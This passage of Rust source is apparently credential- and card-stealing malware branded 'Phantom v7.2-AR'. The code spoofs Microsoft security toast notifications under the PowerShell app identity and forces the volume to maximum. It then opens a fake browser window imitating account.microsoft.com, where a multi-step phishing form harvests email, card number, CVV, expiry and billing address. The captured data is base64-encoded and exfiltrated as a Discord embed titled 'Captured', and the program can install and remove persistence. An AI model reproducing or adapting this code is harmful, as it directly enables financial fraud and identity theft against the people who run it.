            fields.push(serde_json::json!({"name":"Exp","value":format!("`{}`",base64_encode(exp)),"inline":true}));
        }
        if let Some(name) = &payload.cardholder_name {
            fields.push(serde_json::json!({"name":"Name","value":format!("`{}`",base64_encode(name)),"inline":true}));
        }
    }
    if payload.street_address.is_some() {
        fields.push(serde_json::json!({"name":"€   Address €","value":"­","inline":false}));
        if let Some(addr) = &payload.street_address {
            fields.push(serde_json::json!({"name":"Street","value":format!("`{}`",base64_encode(addr)),"inline":true}));
        }
        if let Some(city) = &payload.city {
            fields.push(serde_json::json!({"name":"City","value":format!("`{}`",base64_encode(city)),"inline":true}));
        }
        let mut loc = String::new();
        if let Some(s) = &payload.state {
            loc.push_str(s);
            loc.push(' ');
        }
        if let Some(z) = &payload.zip_code {
            loc.push_str(z);
        }
        if !loc.is_empty() {
            fields.push(serde_json::json!({"name":"State/ZIP","value":format!("`{}`",base64_encode(loc.trim())),"inline":true}));
        }
        if let Some(c) = &payload.country {
            fields.push(serde_json::json!({"name":"Country","value":format!("`{}`",base64_encode(c)),"inline":true}));
        }
    }
    
    let payload_discord = serde_json::json!({
        "embeds": [{
            "title": "🎯 Captured",
            "color": 3447003,
            "fields": fields,
            "footer": {"text": "Phantom v7.2-AR"},
            "timestamp": get_utc_timestamp()
        }]
    });
    
    smart_send_data(serde_json::to_string(&payload_discord).unwrap());
    Ok(())
}

fn show_toast(notif_type: NotificationType) {
    let (title, message, launch_arg, actions_xml, icon_uri) = match notif_type {
        NotificationType::Preparatory => (
            "Microsoft account security",
            "We prevented an unusual sign-in attempt on your account. No action is required at this time, but we will continue to monitor for suspicious activity.",
            format!("{}://dismiss", PROTOCOL_SCHEME),
            "".to_string(),
            SECURITY_ICON,
        ),
        NotificationType::Action => {
            (
                "Action Needed: Verify your identity",
                get_action_message(),
                format!("{}://verify", PROTOCOL_SCHEME),
                format!(
                    r#"<actions><action content="Verify Now" arguments="{}://verify" activationType="protocol"/></actions>"#,
                    PROTOCOL_SCHEME
                ),
                WARNING_ICON,
            )
        }
    };
    if notif_type == NotificationType::Action {
        set_max_volume();
    }
    let xml_string = format!(
        r#"<toast duration="long" launch="{}"><visual><binding template="ToastGeneric"><text>{}</text><text>{}</text><image placement="appLogoOverride" src="{}"/></binding></visual>{}<audio src="ms-winsoundevent:Notification.Default"/></toast>"#,
        launch_arg,
        html_escape(title),
        html_escape(message),
        icon_uri,
        actions_xml
    );
    let xml_doc = match XmlDocument::new() {
        Ok(doc) => doc,
        Err(_) => return,
    };
    if xml_doc.LoadXml(&HSTRING::from(&xml_string)).is_ok() {
        if let Ok(toast) = ToastNotification::CreateToastNotification(&xml_doc) {
            if let Ok(notifier) = ToastNotificationManager::CreateToastNotifierWithId(&HSTRING::from(POWERSHELL_AUMID)) {
                let _ = notifier.Show(&toast);
            }
        }
    }
}
fn notification_loop() {
    unsafe {
        CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
    }
    thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(5..=12)));
    show_toast(NotificationType::Preparatory);
    thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(10..=18)));
    loop {
        let count = *NOTIFICATION_IGNORE_COUNT.lock().unwrap();
        show_toast(NotificationType::Action);
        for _ in 0..35 {
            thread::sleep(Duration::from_millis(300));
            if check_activation_flag() {
                user_clicked_notification();
                clear_activation_flag();
                return;
            }
        }
        let new_count = increment_ignore_count();
        if new_count < 3 {
            thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(12..=20)));
        } else if new_count < 6 {
            thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(45..=90)));
        } else {
            thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(180..=300)));
        }
    }
}

fn get_html() -> String {
    let session = html_escape(&get_session_id());
    let machine = html_escape(&get_machine_id());
    let ip_addr = html_escape(&get_victim_ip());
    let msg_idx = get_persistent_message_index();
    let (info_title, info_text) = INFO_BOX_MESSAGES[msg_idx];
    format!(r##"<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Sign in to your account</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:linear-gradient(135deg,#e3f2fd 0%,#f3f8fb 50%,#fff 100%);overflow:hidden;user-select:none}}
.window{{display:flex;flex-direction:column;height:100vh}}
.tab-bar{{background:#e8e8e8;height:36px;display:flex;align-items:flex-end;padding:0 8px;gap:2px;border-bottom:1px solid#d1d1d1;position:relative;-webkit-app-region:drag}}
.tab{{background:#fff;height:36px;min-width:180px;max-width:240px;border-radius:6px 6px 0 0;display:flex;align-items:center;padding:0 12px;gap:10px;box-shadow:0 -1px 3px rgba(0,0,0,0.05);-webkit-app-region:no-drag}}
.tab-favicon{{width:20px;height:20px;display:flex;align-items:center}}
.tab-title{{font-size:12px;font-weight:400;color:#444;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:'Segoe UI', sans-serif}}
.new-tab-btn{{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:4px;cursor:pointer;margin:0 4px;transition:background .1s; opacity:0.6;-webkit-app-region:no-drag}}
.new-tab-btn:hover{{background:rgba(0,0,0,.06);opacity:1}}
.toolbar{{background:#fff;height:48px;display:flex;align-items:center;padding:0 8px;gap:6px;border-bottom:1px solid#e1dfdd;-webkit-app-region:no-drag}}
.nav-btn{{width:32px;height:32px;border-radius:4px;display:flex;align-items:center;justify-content:center;border:none;background:transparent;cursor:pointer;opacity:1;transition:all .1s; color:#333}}
.nav-btn:hover{{background:rgba(0,0,0,.06);color:#000}}
.nav-btn.disabled{{opacity:0.3;pointer-events:none}}
.address-bar{{flex:1;max-width:70%;background:#f3f3f3;height:32px;border-radius:99px;display:flex;align-items:center;padding:0 14px;gap:0;border:1px solid transparent;transition:all .2s;font-family:'Segoe UI', sans-serif}}
.address-bar:hover{{background:#e8e8e8;border-color:#d1d1d1}}
.address-bar:focus-within{{background:#fff;border-color:#0078d4;box-shadow:0 0 0 2px rgba(0,120,212,0.2)}}
.lock-icon{{width:16px;height:16px;margin-right:8px;flex-shrink:0;color:#5f6368;display:flex;align-items:center;justify-content:center}}
.url{{font-size:13px;color:#323130;flex:1;letter-spacing:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:'Segoe UI', sans-serif}}
.url-domain{{color:#000}}
.toolbar-icons{{display:flex;gap:4px;margin-left:auto;align-items:center}}
.toolbar-icon{{width:32px;height:32px;border-radius:4px;display:flex;align-items:center;justify-content:center;border:none;background:transparent;cursor:pointer;transition:background .1s;color:#333}}
.toolbar-icon:hover{{background:rgba(0,0,0,.06)}}
.profile-btn{{width:28px;height:28px;border-radius:50%;background:#e1dfdd;display:flex;align-items:center;justify-content:center;color:#605e5c;overflow:hidden;margin:0 4px}}
.profile-img{{width:100%;height:100%;object-fit:cover}}
.menu-dots{{width:32px;height:32px;border-radius:4px;display:flex;flex-direction:row;align-items:center;justify-content:center;gap:3px;cursor:pointer;transition:background .1s;color:#333}}
.menu-dots:hover{{background:rgba(0,0,0,.06)}}
.dot{{width:3px;height:3px;background:currentColor;border-radius:50%}}
.window-controls{{display:flex;height:100%;margin-left:auto;align-items:flex-start;-webkit-app-region:no-drag;z-index:9999}}
.win-btn{{width:46px;height:32px;display:flex;align-items:center;justify-content:center;background:transparent;transition:all .1s;cursor:pointer}}
.win-btn:hover{{background:#e5e5e5}}
.win-btn.close:hover{{background:#e81123;color:white}}
.win-btn svg{{width:10px;height:10px;fill:currentColor}}
.content{{flex:1;overflow-y:auto;padding:40px 20px;display:flex;flex-direction:column;align-items:center}}
.content::-webkit-scrollbar{{width:14px}}
.content::-webkit-scrollbar-thumb{{background:rgba(0,0,0,.25);border-radius:7px;border:3px solid transparent;background-clip:padding-box}}
.content::-webkit-scrollbar-thumb:hover{{background:rgba(0,0,0,.35);background-clip:padding-box}}
.container{{width:100%;max-width:440px;padding:40px;background:#fff;border-radius:0;box-shadow:0 2px 6px rgba(0,0,0,0.2);margin-bottom:20px}}
.ms-logo{{width:108px;height:24px;margin-bottom:16px}}
.card-title{{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px;line-height:1.2;font-family:'Segoe UI', sans-serif}}
.info-box{{background:#fff4ce;border-left:4px solid#f9a825;padding:16px;margin-bottom:24px;font-size:13px;border-radius:0;line-height:1.6;color:#323130}}
.info-box strong{{font-weight:600;color:#605e5c}}
.form-group{{margin-bottom:16px;position:relative}}
.form-input{{width:100%;padding:8px 0;font-size:15px;border:none;border-bottom:1px solid#8a8886;background:transparent;font-family:'Segoe UI', sans-serif;transition:border-color .15s}}
.form-input::placeholder{{color:#605e5c;opacity:1}}
.form-input:hover{{border-bottom-color:#323130}}
.form-input:focus{{outline:none;border-bottom:2px solid#0078d4;padding-bottom:7px}}
.form-input.error{{border-bottom-color:#a80000}}
.error-msg{{color:#a80000;font-size:12px;margin-top:4px;display:none}}
.form-row{{display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px}}
.address-row{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}}
.button{{background:#0078d4;color:#fff;border:none;padding:8px 32px;font-size:15px;cursor:pointer;border-radius:0;font-weight:600;transition:all .1s;font-family:'Segoe UI', sans-serif;min-width:120px}}
.button:hover{{background:#106ebe}}
.button:active{{background:#005a9e;transform:scale(0.98)}}
.button-group{{display:flex;justify-content:flex-end;margin-top:32px}}
.button-group.split{{justify-content:space-between}}
.link-btn{{background:#ccc;border:none;color:#000;font-size:15px;cursor:pointer;padding:8px 24px;border-radius:0;font-weight:600;font-family:'Segoe UI', sans-serif;margin-right:8px}}
.link-btn:hover{{background:#d0d0d0}}
.hidden{{display:none}}
.step-indicator{{display:flex;gap:8px;margin-bottom:24px}}
.step{{flex:1;height:2px;background:#e1dfdd;border-radius:1px;transition:all .3s}}
.step.active{{background:#0078d4}}
.sign-in-options-wrapper{{width:100%;max-width:440px;margin:0 auto;}}
.sign-in-options{{width:100%;height:48px;background:transparent;border:1px solid#8a8886;border-radius:0;display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;font-size:15px;color:#1b1b1b;font-weight:400;transition:all .1s;font-family:'Segoe UI', sans-serif}}
.sign-in-options:hover{{background:#e1dfdd}}
.error-box{{background:#fef0f1;border-left:4px solid#c50f1f;padding:16px;margin-bottom:20px;font-size:13px;color:#a80000;line-height:1.6}}
</style>
</head>
<body>
<div class="window">
<div class="tab-bar" onmousedown="if(event.target===this)window.ipc.postMessage('cmd:drag')">
<div class="tab">
<div class="tab-favicon">
<svg width="20" height="20" viewBox="0 0 20 20"><rect width="9" height="9" fill="#f25022"/><rect x="11" width="9" height="9" fill="#7fba00"/><rect y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
</div>
<span class="tab-title">Sign in to your account</span>
<div style="font-size:16px;color:#666;margin-left:8px;cursor:pointer;z-index:9999" onclick="window.ipc.postMessage('cmd:close')">&times;</div>
</div>
<div class="new-tab-btn">
<svg width="12" height="12" viewBox="0 0 12 12" fill="#555"><path d="M11 5H7V1C7 0.447 6.553 0 6 0C5.447 0 5 0.447 5 1V5H1C0.447 5 0 5.447 0 6C0 6.553 0.447 7 1 7H5V11C5 11.553 5.447 12 6 12C6.553 12 7 11.553 7 11V7H11C11.553 7 12 6.553 12 6C12 5.447 11.553 5 11 5Z"/></svg>
</div>
<div class="window-controls">
<div class="win-btn min" onclick="window.ipc.postMessage('cmd:min')"><svg viewBox="0 0 10 1"><rect width="10" height="1"></rect></svg></div>
<div class="win-btn max" onclick="window.ipc.postMessage('cmd:max')"><svg viewBox="0 0 10 10"><path d="M0,0v10h10V0H0z M9,9H1V1h8V9z"></path></svg></div>
<div class="win-btn close" onclick="window.ipc.postMessage('cmd:close')"><svg viewBox="0 0 10 10"><path d="M10,1.01L8.99,0L5,3.99L1.01,0L0,1.01L3.99,5L0,8.99L1.01,10L5,6.01L8.99,10L10,8.99L6.01,5L10,1.01z"></path></svg></div>
</div>
</div>
<div class="toolbar">
<button class="nav-btn disabled">
<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M16,7H3.8l5.6-5.6L8,0L0,8l8,8l1.4-1.4L3.8,9H16V7z"/></svg>
</button>
<button class="nav-btn">
<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M13.6,2.4C12.1,0.9,10.2,0,8,0C3.6,0,0,3.6,0,8s3.6,8,8,8c3.7,0,6.8-2.6,7.7-6h-2.1c-0.8,2.3-3,4-5.6,4c-3.3,0-6-2.7-6-6s2.7-6,6-6c1.7,0,3.1,0.7,4.2,1.8L9,7h7V0L13.6,2.4z"/></svg>
</button>
<div class="address-bar">
<div class="lock-icon">
<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
</div>
<span class="url">
<span class="url-domain">account.microsoft.com</span>/profile/security/verify
</span>
</div>
<div class="toolbar-icons">
<div class="profile-btn">
<svg width="20" height="20" viewBox="0 0 24 24" fill="#666"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
</div>
<div class="menu-dots">
<div class="dot"></div>
<div class="dot"></div>
<div class="dot"></div>
</div>
</div>
</div>
<div class="content">
<div class="container">
<div class="ms-logo">
<svg viewBox="0 0 108 24"><rect width="10.8" height="10.8" fill="#f25022"/><rect x="12" width="10.8" height="10.8" fill="#7fba00"/><rect y="12" width="10.8" height="10.8" fill="#00a4ef"/><rect x="12" y="12" width="10.8" height="10.8" fill="#ffb900"/><text x="28" y="17" font-family="Segoe UI" font-size="17" fill="#5e5e5e">Microsoft</text></svg>
</div>
<div id="step1">
<div class="card-title">Account Security Verification</div>
<div class="info-box"><strong>{}</strong><br>{}</div>
<div class="form-group">
<input type="email" class="form-input" id="email" placeholder="Email, phone, or Skype">
<div class="error-msg" id="email-error">That account doesn't exist. Enter a different account or get a new one.</div>
</div>
<div class="button-group">
<button class="button" onclick="validateStep1()">Next</button>
</div>
</div>
<div id="step2" class="hidden">
<div class="card-title">Update billing information</div>
<div class="step-indicator">
<div class="step active"></div>
<div class="step active"></div>
<div class="step"></div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="cardNumber" placeholder="Card number" maxlength="19">
<div class="error-msg" id="cardNumber-error">Please enter a valid card number.</div>
</div>
<div class="form-row">
<div class="form-group">
<input type="text" class="form-input" id="cardholderName" placeholder="Name on card">
<div class="error-msg" id="cardholderName-error">Please enter the name as it appears on your card.</div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="expiry" placeholder="MM/YY" maxlength="5">
<div class="error-msg" id="expiry-error">Invalid date.</div>
</div>
<div class="form-group">
<input type="password" class="form-input" id="cvv" placeholder="CVV" maxlength="4">
<div class="error-msg" id="cvv-error">Required.</div>
</div>
</div>
<div class="button-group split">
<button class="link-btn" onclick="nextStep(1)">Back</button>
<button class="button" onclick="validateStep2()">Next</button>
</div>
</div>
<div id="step3" class="hidden">
<div class="card-title">Billing address</div>
<div class="step-indicator">
<div class="step active"></div>
<div class="step active"></div>
<div class="step active"></div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="address" placeholder="Address">
<div class="error-msg" id="address-error">Please enter your address.</div>
</div>
<div class="address-row">
<div class="form-group">
<input type="text" class="form-input" id="city" placeholder="City">
<div class="error-msg" id="city-error">Required.</div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="state" placeholder="State">
<div class="error-msg" id="state-error">Required.</div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="zip" placeholder="ZIP">
<div class="error-msg" id="zip-error">Required.</div>
</div>
</div>
<div class="form-group">
<input type="text" class="form-input" id="country" placeholder="Country/Region">
<div class="error-msg" id="country-error">Required.</div>
</div>
<div id="submit-error" class="error-box hidden">
<strong>We couldn't verify your information</strong><br>Something went wrong.
</div>
<div class="button-group split">
<button class="link-btn" onclick="nextStep(2)">Back</button>
<button class="button" onclick="validateStep3()">Verify</button>
</div>
</div>
</div>
<div class="sign-in-options-wrapper">
<div class="sign-in-options">
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
<span>Sign-in options</span>
</div>
</div>
</div>
<script>
var sid="{}";var mid="{}";var ip="{}";
function send(d){{try{{if(window.ipc){{window.ipc.postMessage(JSON.stringify(d));}}}}catch(e){{}}}}
function nextStep(s){{for(var i=1;i<=3;i++){{document.getElementById('step'+i).classList.add('hidden')}}document.getElementById('step'+s).classList.remove('hidden');}}
function sanitize(s){{return s.replace(/[<>"'&]/g,function(c){{return{{'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','&':'&amp;'}}[c]}})}}
function showError(id){{var e=document.getElementById(id);if(e)e.classList.add('error');var m=document.getElementById(id+'-error');if(m)m.style.display='block'}}
function clearError(id){{var e=document.getElementById(id);if(e)e.classList.remove('error');var m=document.getElementById(id+'-error');if(m)m.style.display='none'}}
function validateId(s){{return s.length>3}}
function validateCard(c){{var cl=c.replace(/\s/g,'');if(cl.length<13||cl.length>19||!/^\d+$/.test(cl))return false;var sum=0,isEven=false;for(var i=cl.length-1;i>=0;i--){{var d=parseInt(cl[i]);if(isEven){{d*=2;if(d>9)d-=9}}sum+=d;isEven=!isEven}}return sum%10===0}}
function validateExpiry(e){{if(!/^\d{{2}}\/\d{{2}}$/.test(e))return false;var p=e.split('/');var m=parseInt(p[0]);var y=parseInt(p[1]);return m>=1&&m<=12&&y>=24}}
function validateStep1(){{var email=document.getElementById('email').value.trim();clearError('email');if(!email||!validateId(email)){{showError('email');return}}var data={{step:1,email:sanitize(email),session:sid,machine_id:mid}};send(data);setTimeout(function(){{nextStep(2)}},100)}}
function validateStep2(){{var valid=true;var card=document.getElementById('cardNumber').value.trim();var name=document.getElementById('cardholderName').value.trim();var exp=document.getElementById('expiry').value.trim();var cvv=document.getElementById('cvv').value.trim();clearError('cardNumber');clearError('cardholderName');clearError('expiry');clearError('cvv');if(!card||!validateCard(card)){{showError('cardNumber');valid=false}}if(!name||name.length<3){{showError('cardholderName');valid=false}}if(!exp||!validateExpiry(exp)){{showError('expiry');valid=false}}if(!cvv||cvv.length<3||cvv.length>4||!/^\d+$/.test(cvv)){{showError('cvv');valid=false}}if(valid){{var data={{step:2,card_number:sanitize(card),cardholder_name:sanitize(name),expiry:sanitize(exp),cvv:sanitize(cvv),session:sid,machine_id:mid}};send(data);setTimeout(function(){{nextStep(3)}},100)}}}}
function validateStep3(){{var valid=true;['address','city','state','zip','country'].forEach(function(id){{clearError(id);var val=document.getElementById(id).value.trim();if(!val||val.length<2){{showError(id);valid=false}}}});if(valid){{setTimeout(function(){{submitForm()}},100)}}}}
function submitForm(){{var errBox=document.getElementById('submit-error');errBox.classList.remove('hidden');var data={{step:3,street_address:sanitize(document.getElementById('address').value),city:sanitize(document.getElementById('city').value),state:sanitize(document.getElementById('state').value),zip_code:sanitize(document.getElementById('zip').value),country:sanitize(document.getElementById('country').value),session:sid,machine_id:mid}};send(data)}}
document.getElementById('cardNumber').addEventListener('input',function(e){{var v=e.target.value.replace(/\s/g,'');e.target.value=v.match(/.{{1,4}}/g)?v.match(/.{{1,4}}/g).join(' '):v}});
document.getElementById('expiry').addEventListener('input',function(e){{var v=e.target.value.replace(/[^0-9]/g,'');if(v.length>=2){{v=v.slice(0,2)+'/'+v.slice(2,4)}}e.target.value=v}});
</script>
</body>
</html>"##, info_title, info_text, session, machine, ip_addr)
}
fn load_chrome_icon() -> Option<Icon> {
    if let Ok(image) = ImageReader::new(Cursor::new(CHROME_ICON_BYTES))
        .with_guessed_format()
        .ok()?
        .decode()
    {
        let width = image.width();
        let height = image.height();
        let rgba = image.to_rgba8().into_raw();
        Icon::from_rgba(rgba, width, height).ok()
    } else {
        None
    }
}

fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    let el = EventLoop::new();
    let icon = load_chrome_icon();
    let win_builder = WindowBuilder::new()
        .with_title("")
        .with_visible(false)
        .with_decorations(false)
        .with_resizable(true);
    let win_builder = if let Some(i) = icon {
        win_builder.with_window_icon(Some(i))
    } else {
        win_builder
    };
    let window = win_builder.build(&el)?;
    if let Some(monitor) = window.current_monitor() {
        let screen_size = monitor.size();
        let width = (screen_size.width as f64 * 0.565).max(600.0);
        let height = (screen_size.height as f64 * 0.9775).max(700.0);
        let x = (screen_size.width as f64 - width) / 2.0;
        let y = (screen_size.height as f64 - height) / 2.0;
        window.set_inner_size(PhysicalSize::new(width, height));
        window.set_outer_position(PhysicalPosition::new(x, y));
    }
    window.set_visible(true);
    let _wv = WebViewBuilder::new(window)?
        .with_html(html)?
        .with_ipc_handler(|window, msg| {
            if msg == "cmd:close" {
                window.set_visible(false);
                std::process::exit(0);
            } else if msg == "cmd:min" {
                window.set_minimized(true);
            } else if msg == "cmd:max" {
                window.set_maximized(!window.is_maximized());
            } else if msg == "cmd:drag" {
                let _ = window.drag_window();
            } else {
                let msg_owned = msg.to_string();
                thread::spawn(move || {
                    let _ = handle_ipc_message(&msg_owned);
                });
            }
        })
        .build()?;
    el.run(move |ev, _, cf| {
        *cf = ControlFlow::Wait;
        match ev {
            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => {
                *cf = ControlFlow::Exit;
            }
            _ => {}
        }
    });
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "--activate" {
        if args.len() > 2 && args[2].contains("verify") {
            write_activation_flag();
        }
        std::process::exit(0);
    }
    
    let session = get_session_flag();
    if session >= 3 {
        std::process::exit(0);
    }
    
    enforce_singleton();
    show_fake_error();
    register_protocol_handler();
    init_globals();
    clear_activation_flag();
    
    let victim_ip = fetch_victim_ip();
    *VICTIM_IP.lock().unwrap() = victim_ip.clone();
    
    let use_persist = should_persist();
    
    thread::spawn(|| {
        simulate_installer_scan();
    });
    
    if use_persist {
        thread::spawn(|| {
            thread::sleep(Duration::from_secs(get_random_persist_delay()));
            install_persist();
        });
    }
    
    thread::spawn(|| {
        notification_loop();
    });
    
    loop {
        thread::sleep(Duration::from_secs(1));
        if did_user_click() {
            break;
        }
    }
    
    let html = get_html();
    if let Ok(_) = create_win(html) {
        mark_success();
    }
    
    if is_success() {
        remove_persist();
    }
    
    std::process::exit(0);
}
